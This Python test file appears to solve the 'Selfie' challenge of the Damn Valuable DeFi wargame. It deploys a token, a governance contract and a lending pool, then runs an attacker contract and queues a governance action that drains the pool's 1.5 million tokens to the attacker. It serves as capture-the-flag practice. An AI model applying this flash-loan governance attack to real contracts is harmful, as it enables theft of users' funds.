from brownie import (
    accounts,
    DamnValuableTokenSnapshot,
    SelfiePool,
    SimpleGovernance,
    AttackSelfiePool,
)
from brownie.network.account import Account
from brownie.network.state import Chain
from brownie.project import build


def test_selfie():
    deployer: Account = accounts[0]
    attacker: Account = accounts[1]
    TOKEN_INITIAL_SUPPLY = 2000000e18
    TOKENS_IN_POOL = 1500000e18
    token = DamnValuableTokenSnapshot.deploy(TOKEN_INITIAL_SUPPLY, {"from": deployer})
    governance = SimpleGovernance.deploy(token.address, {"from": deployer})
    pool = SelfiePool.deploy(token.address, governance.address, {"from": deployer})
    token.transfer(pool.address, TOKENS_IN_POOL, {"from": deployer})
    assert token.balanceOf(pool.address) == TOKENS_IN_POOL
    # YOUR EXPLOIT GOES HERE
    asp = AttackSelfiePool.deploy(pool.address, governance.address, {"from": attacker})
    asp.run(TOKENS_IN_POOL)
    Chain().sleep(2 * 24 * 60 * 60)
    governance.executeAction(1, {"from": attacker})

    # SUCCESS CONDITIONS
    assert token.balanceOf(attacker.address) == TOKENS_IN_POOL
    assert token.balanceOf(pool.address) == 0
